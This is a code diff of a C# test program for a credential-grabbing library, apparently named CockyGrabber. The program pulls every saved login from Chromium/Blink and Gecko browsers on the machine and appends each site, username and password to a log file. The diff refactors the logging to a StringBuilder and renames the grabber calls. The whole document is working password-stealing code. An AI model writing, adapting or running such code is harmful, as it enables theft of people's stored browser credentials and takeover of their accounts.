@@ -1,8 +1,8 @@
 using CockyGrabber;
 using CockyGrabber.Grabbers;
 using System;
-using System.Collections.Generic;
 using System.IO;
+using System.Text;
 
 namespace CockyGrabberTest
 {
@@ -15,24 +15,23 @@ namespace CockyGrabberTest
         {
             UniversalGrabber g = new UniversalGrabber(); // Create Grabber
 
-            List<string> logins = new List<string>()
-            {
-                $"==========================================================================================",
-                $"NEW LOG STARTED AT {DateTimeOffset.Now}:",
-                "",
-            };
+            StringBuilder logins = new StringBuilder();
+            logins.AppendLine();
+            logins.AppendLine("==========================================================================================");
+            logins.AppendLine($"NEW LOG STARTED AT {DateTimeOffset.Now}:");
+            logins.AppendLine();
 
             // Grab logins and store the URLs, Usernames and Passwords in 'logins':
-            foreach (Blink.Login c in g.GetAllChromiumLogins())
+            foreach (Blink.Login c in g.GetAllBlinkLogins())
             {
-                logins.Add($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.DecryptedPasswordValue}");
+                logins.AppendLine($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.PasswordValue}");
             }
-            foreach (Gecko.Login c in g.FG.GetLogins())
+            foreach (Gecko.Login c in g.GetAllGeckoLogins())
             {
-                logins.Add($"Website: {c.Hostname} | Username: {c.DecryptedUsername} | Password: {c.DecryptedPassword}");
+                logins.AppendLine($"Website: {c.Hostname} | Username: {c.EncryptedUsername} | Password: {c.EncryptedPassword}");
             }
 
-            File.AppendAllLines(LogFilePath, logins); // Append the grabbed Logins to the log file
+            File.AppendAllText(LogFilePath, logins.ToString()); // Append the grabbed Logins to the log file
         }
     }
 }
